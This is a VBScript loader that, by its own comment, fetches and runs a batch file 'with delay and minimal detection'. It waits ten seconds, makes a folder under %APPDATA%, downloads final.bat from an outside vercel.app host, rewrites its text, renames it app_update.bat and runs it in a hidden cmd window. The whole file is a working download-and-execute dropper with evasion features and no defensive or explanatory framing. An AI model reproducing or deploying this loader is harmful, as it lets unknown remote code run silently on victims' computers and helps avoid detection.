' Script to fetch, alter, and execute a batch file with delay and minimal detection
' Removes old files, pauses 10s, sets up folder, downloads file, edits text, runs it

Dim sh, fs, fldr, prntFldr, http, strm, cntnt, btFl
Set sh = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
WScript.Sleep 10000
fldr = sh.ExpandEnvironmentStrings("%APPDATA%") & "\CustomApp\Temp"
If fs.FolderExists(fldr) Then
    fs.DeleteFolder fldr, True
End If
prntFldr = Left(fldr, InStrRev(fldr, "\") - 1)
If Not fs.FolderExists(prntFldr) Then
    fs.CreateFolder prntFldr
End If
fs.CreateFolder fldr
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False
http.Send
Set strm = CreateObject("ADODB.Stream")
strm.Type = 1
strm.Open
strm.Write http.responseBody
strm.Position = 0
strm.Type = 2
strm.Charset = "utf-8"
cntnt = strm.ReadText
cntnt = Replace(cntnt, "****", "----")
btFl = fldr & "\app_update.txt"
strm.Position = 0
strm.SetEOS
strm.WriteText cntnt
strm.SaveToFile btFl, 2
If fs.FileExists(fldr & "\app_update.bat") Then
    fs.DeleteFile fldr & "\app_update.bat"
End If
fs.MoveFile btFl, fldr & "\app_update.bat"
sh.Run "cmd.exe /c " & Chr(34) & fldr & "\app_update.bat" & Chr(34), 0, False
